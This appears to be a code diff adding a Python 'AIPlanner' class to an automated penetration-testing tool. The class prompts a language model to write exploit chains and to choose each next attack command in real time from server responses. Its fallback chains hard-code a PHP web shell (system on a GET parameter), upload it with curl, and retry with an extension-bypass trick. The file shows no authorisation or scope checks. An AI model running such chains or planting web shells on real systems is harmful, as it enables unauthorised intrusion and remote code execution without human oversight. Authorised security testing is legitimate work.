@@ -1,0 +1,449 @@
+import json
+from langchain_openai import ChatOpenAI
+from langchain_core.prompts import PromptTemplate
+import config
+import re
+import os
+import hashlib
+import time
+from datetime import datetime, timedelta
+
+class AIPlanner:
+    """AI planning - DYNAMIC exploit chains dựa trên response real-time"""
+    
+    CACHE_EXPIRY_DAYS = 7
+    
+    def __init__(self, state, logger):
+        self.state = state
+        self.logger = logger
+        self.llm = None
+        self.cache = {}
+        self.current_chain = None  # Chain đang thực thi
+        self.chain_history = []    # Lịch sử chains đã chạy
+        
+        # Load cache nếu có
+        self.load_cache()
+    
+    def load_cache(self):
+        """Load AI cache"""
+        cache_file = config.RESULT_PATH + "ai_cache.json"
+        try:
+            if os.path.exists(cache_file):
+                file_age = time.time() - os.path.getmtime(cache_file)
+                file_age_days = file_age / (24 * 3600)
+                
+                if file_age_days > self.CACHE_EXPIRY_DAYS:
+                    print("   └─ 📦 Cache expired, will regenerate")
+                    self.cache = {}
+                    return
+                
+                with open(cache_file, 'r') as f:
+                    cache_data = json.load(f)
+                    
+                current_time = time.time()
+                self.cache = {}
+                for key, value in cache_data.items():
+                    if isinstance(value, dict) and 'timestamp' in value:
+                        cache_time = datetime.fromisoformat(value['timestamp']).timestamp()
+                        if (current_time - cache_time) < (self.CACHE_EXPIRY_DAYS * 24 * 3600):
+                            self.cache[key] = value['data']
+        except Exception as e:
+            print(f"   └─ ⚠️ Cache load error: {e}")
+            self.cache = {}
+    
+    def save_cache(self):
+        """Save AI cache"""
+        cache_file = config.RESULT_PATH + "ai_cache.json"
+        
+        cache_to_save = {}
+        current_time = datetime.now()
+        
+        for key, value in self.cache.items():
+            cache_to_save[key] = {
+                'timestamp': current_time.isoformat(),
+                'data': value
+            }
+        
+        if len(cache_to_save) > 100:
+            sorted_items = sorted(
+                cache_to_save.items(),
+                key=lambda x: x[1]['timestamp'],
+                reverse=True
+            )[:100]
+            cache_to_save = dict(sorted_items)
+        
+        try:
+            with open(cache_file, 'w') as f:
+                json.dump(cache_to_save, f, indent=2)
+        except Exception as e:
+            print(f"   └─ ⚠️ Cache save error: {e}")
+    
+    def init_llm(self):
+        if not self.llm:
+            self.llm = ChatOpenAI(
+                api_key=config.GROQ_API_KEY,
+                base_url="https://api.groq.com/openai/v1",
+                model="llama-3.3-70b-versatile",
+                temperature=0.1
+            )
+    
+    def create_plan(self):
+        """Tạo initial attack plan - nhưng sẽ được update dynamic"""
+        
+        # Check cache
+        cache_key = self.create_cache_key()
+        if cache_key in self.cache:
+            print("   └─ 📦 Using cached AI plan")
+            return self.cache[cache_key]
+        
+        self.init_llm()
+        
+        # === THU THẬP DỮ LIỆU ===
+        critical_findings = []
+        tech_findings = []
+        
+        for v in self.state.vulnerabilities:
+            info = v.get('info', {})
+            name = info.get('name', '')
+            severity = info.get('severity', 'unknown')
+            host = v.get('host', '')
+            
+            finding = f"- {name} ({severity}) at {host}"
+            
+            if severity in ['critical', 'high']:
+                critical_findings.append(finding)
+            else:
+                tech_findings.append(finding)
+        
+        # WordPress data
+        wp_findings = []
+        if self.state.wordpress_data:
+            wp_version = self.state.wordpress_data.get('version', 'unknown')
+            wp_findings.append(f"- WordPress version: {wp_version}")
+            
+            for plugin in self.state.wordpress_data.get('plugins', []):
+                wp_findings.append(f"- Plugin: {plugin.get('slug')} v{plugin.get('version')}")
+        
+        # Fragments summary
+        fragments_summary = self.state.get_fragments_summary() if hasattr(self.state, 'get_fragments_summary') else {}
+        
+        fragments_text = []
+        for f_type, f_data in fragments_summary.items():
+            fragments_text.append(f"- {f_type}: {f_data['count']} occurrences (severity: {f_data['severity']})")
+        
+        # Priority endpoints từ crawler
+        priority_urls = []
+        if hasattr(self.state, 'priority_endpoints') and self.state.priority_endpoints:
+            for url_data in self.state.priority_endpoints[:10]:
+                priority_urls.append(f"- {url_data['url']} (score: {url_data['score']})")
+        
+        prompt = PromptTemplate.from_template("""
+You are a senior penetration tester. Create an INITIAL attack plan that will be updated dynamically.
+
+TARGET: {target}
+
+=== CRITICAL FINDINGS ===
+{critical_findings}
+
+=== TECHNOLOGY ===
+{tech_findings}
+
+=== WORDPRESS ===
+{wp_findings}
+
+=== FRAGMENTS ===
+{fragments}
+
+=== PRIORITY ENDPOINTS ===
+{priority_urls}
+
+TASK: Create 3 initial attack chains. Each chain should have:
+
+1. Chain name
+2. Initial success probability
+3. First step to try
+4. What to look for in response
+5. Possible next steps based on response
+
+The key is: each step should have MULTIPLE possible next steps depending on response.
+
+RESPOND WITH JSON:
+{{
+  "chains": [
+    {{
+      "name": "Chain name",
+      "initial_success_rate": "HIGH/MEDIUM/LOW",
+      "first_step": {{
+        "command": "actual command",
+        "expected_response": "what to look for",
+        "success_indicators": ["indicator1", "indicator2"],
+        "failure_indicators": ["indicator1", "indicator2"]
+      }},
+      "possible_paths": [
+        {{
+          "if_response_contains": "pattern",
+          "next_step": "next command",
+          "new_success_rate": "updated probability"
+        }}
+      ],
+      "fallback": "what to do if nothing works"
+    }}
+  ]
+}}
+""")
+        
+        try:
+            critical_text = '\n'.join(critical_findings) if critical_findings else "No critical findings"
+            tech_text = '\n'.join(tech_findings) if tech_findings else "No technology findings"
+            wp_text = '\n'.join(wp_findings) if wp_findings else "No WordPress data"
+            fragments_text = '\n'.join(fragments_text) if fragments_text else "No fragments"
+            priority_text = '\n'.join(priority_urls) if priority_urls else "No priority endpoints"
+            
+            result = self.llm.invoke(prompt.format(
+                target=self.state.target,
+                critical_findings=critical_text,
+                tech_findings=tech_text,
+                wp_findings=wp_text,
+                fragments=fragments_text,
+                priority_urls=priority_text
+            ))
+            
+            plan = self.parse_response(result.content)
+            
+            if plan and plan.get('chains'):
+                # Thay thế TARGET
+                for chain in plan['chains']:
+                    if 'first_step' in chain and 'command' in chain['first_step']:
+                        chain['first_step']['command'] = chain['first_step']['command'].replace('TARGET', self.state.target)
+                    
+                    if 'possible_paths' in chain:
+                        for path in chain['possible_paths']:
+                            if 'next_step' in path:
+                                path['next_step'] = path['next_step'].replace('TARGET', self.state.target)
+                
+                print(f"   └─ ✅ AI created {len(plan['chains'])} dynamic chains")
+                
+                # Save to cache
+                self.cache[cache_key] = plan['chains']
+                self.save_cache()
+                
+                return plan['chains']
+            else:
+                print("   └─ ⚠️ AI returned invalid plan, using fallback")
+                return self.get_fallback_chains()
+                
+        except Exception as e:
+            print(f"   └─ ❌ AI planning error: {e}")
+            return self.get_fallback_chains()
+    
+    def get_next_step(self, chain: dict, last_response: dict, previous_steps: list) -> dict:
+        """
+        QUAN TRỌNG NHẤT: AI quyết định bước tiếp theo dựa trên response
+        Đây là dynamic part - chain thay đổi theo response
+        """
+        
+        self.init_llm()
+        
+        context = {
+            'chain_name': chain.get('name', 'Unknown'),
+            'last_command': previous_steps[-1] if previous_steps else None,
+            'response': {
+                'status': last_response.get('status_code', 0),
+                'body': last_response.get('body', '')[:500],
+                'headers': last_response.get('headers', {}),
+                'time': last_response.get('response_time', 0)
+            },
+            'previous_steps': previous_steps[-3:],  # 3 bước gần nhất
+            'chain_progress': len(previous_steps)
+        }
+        
+        prompt = PromptTemplate.from_template("""
+You are controlling an exploit chain in REAL TIME.
+
+CHAIN: {chain_name}
+LAST COMMAND: {last_command}
+STEPS SO FAR: {previous_steps}
+
+SERVER RESPONDED:
+Status: {status}
+Time: {time}s
+Headers: {headers}
+
+Response snippet:
+{body}
+
+TASK: Based on this response, decide the NEXT STEP.
+
+OPTIONS:
+1. CONTINUE_CHAIN - Response looks good, proceed as planned
+2. TRY_VARIANT - Need to modify approach (WAF detected)
+3. SWITCH_CHAIN - Current chain failing, try different
+4. MARK_SUCCESS - Got shell/credentials!
+5. ABORT - Nothing working
+
+If CONTINUE_CHAIN or TRY_VARIANT, provide the SPECIFIC next command.
+
+RESPOND WITH JSON:
+{{
+    "decision": "CONTINUE_CHAIN|TRY_VARIANT|SWITCH_CHAIN|MARK_SUCCESS|ABORT",
+    "confidence": 0.95,
+    "reason": "Why this decision",
+    "next_command": "actual command to run",
+    "expected_outcome": "What to look for",
+    "updated_success_probability": 0.8
+}}
+""")
+        
+        try:
+            result = self.llm.invoke(prompt.format(
+                chain_name=context['chain_name'],
+                last_command=context['last_command'],
+                previous_steps=json.dumps(context['previous_steps']),
+                status=context['response']['status'],
+                time=context['response']['time'],
+                headers=json.dumps(context['response']['headers']),
+                body=context['response']['body']
+            ))
+            
+            decision = self.parse_response(result.content)
+            
+            if decision:
+                print(f"            └─ 🤖 AI decision: {decision['decision']} - {decision['reason']}")
+                return decision
+                
+        except Exception as e:
+            print(f"            └─ ⚠️ Next step decision error: {e}")
+        
+        # Fallback decision
+        return {
+            'decision': 'CONTINUE_CHAIN',
+            'confidence': 0.5,
+            'reason': 'Fallback - continuing as planned',
+            'next_command': None,
+            'expected_outcome': 'Unknown',
+            'updated_success_probability': 0.5
+        }
+    
+    def create_new_chain(self, context: dict) -> dict:
+        """
+        Tạo chain mới khi phát hiện cơ hội mới từ response
+        """
+        
+        self.init_llm()
+        
+        prompt = PromptTemplate.from_template("""
+Based on the current context, create a NEW exploit chain.
+
+CURRENT STATE:
+- Found: {findings}
+- Last response: {last_response}
+- Working with: {target}
+
+Create a new chain to exploit these findings.
+
+Return JSON with:
+- name: chain name
+- first_step: command to try
+- success_indicators: what to look for
+""")
+        
+        try:
+            result = self.llm.invoke(prompt.format(
+                findings=json.dumps(context.get('findings', [])),
+                last_response=context.get('last_response', ''),
+                target=self.state.target
+            ))
+            
+            new_chain = self.parse_response(result.content)
+            if new_chain:
+                print(f"            └─ 🆕 AI created new chain: {new_chain.get('name')}")
+                return new_chain
+                
+        except Exception as e:
+            print(f"            └─ ⚠️ New chain creation error: {e}")
+        
+        return None
+    
+    def get_fallback_chains(self):
+        """Fallback chains (giữ nguyên)"""
+        chains = []
+        
+        # PHP old version
+        php_version = self.state.technologies.get('php_version', '')
+        if php_version and php_version < '7.4':
+            chains.append({
+                'name': f'PHP {php_version} EOL Exploit',
+                'initial_success_rate': 'MEDIUM',
+                'first_step': {
+                    'command': f"curl -I http://{self.state.target}/phpinfo.php",
+                    'expected_response': 'PHP version info',
+                    'success_indicators': ['php version', php_version],
+                    'failure_indicators': ['404', '403']
+                },
+                'possible_paths': [
+                    {
+                        'if_response_contains': 'php version',
+                        'next_step': f"searchsploit php {php_version}",
+                        'new_success_rate': 'HIGH'
+                    }
+                ],
+                'fallback': 'Try common PHP exploits'
+            })
+        
+        # Upload endpoints
+        if self.state.has_fragment('upload_form'):
+            chains.append({
+                'name': 'Upload Bypass Chain',
+                'initial_success_rate': 'MEDIUM',
+                'first_step': {
+                    'command': f"echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php && curl -F 'file=@shell.php' http://{self.state.target}/upload.php",
+                    'expected_response': 'Upload success',
+                    'success_indicators': ['uploaded', 'success'],
+                    'failure_indicators': ['error', 'invalid']
+                },
+                'possible_paths': [
+                    {
+                        'if_response_contains': 'error',
+                        'next_step': f"curl -F 'file=@shell.php;.jpg' http://{self.state.target}/upload.php",
+                        'new_success_rate': 'LOW'
+                    }
+                ],
+                'fallback': 'Try extension bypass techniques'
+            })
+        
+        return chains
+    
+    def parse_response(self, content):
+        """Parse JSON từ response"""
+        try:
+            start = content.find('{')
+            end = content.rfind('}') + 1
+            if start >= 0 and end > start:
+                json_str = content[start:end]
+                json_str = re.sub(r',\s*}', '}', json_str)
+                json_str = re.sub(r',\s*]', ']', json_str)
+                return json.loads(json_str)
+        except Exception as e:
+            print(f"      └─ ⚠️ JSON parse error: {e}")
+        return None
+    
+    def create_cache_key(self):
+        """Tạo cache key"""
+        important_data = []
+        
+        critical_vulns = []
+        for v in self.state.vulnerabilities[:10]:
+            info = v.get('info', {})
+            critical_vulns.append(f"{info.get('name','')}:{info.get('severity','')}")
+        
+        fragment_types = sorted(set(f['type'] for f in self.state.fragments))
+        
+        key_parts = [
+            self.state.target,
+            str(len(self.state.vulnerabilities)),
+            '|'.join(critical_vulns),
+            '|'.join(fragment_types[-10:]),
+        ]
+        
+        key_data = '|'.join(key_parts)
+        return hashlib.md5(key_data.encode()).hexdigest()
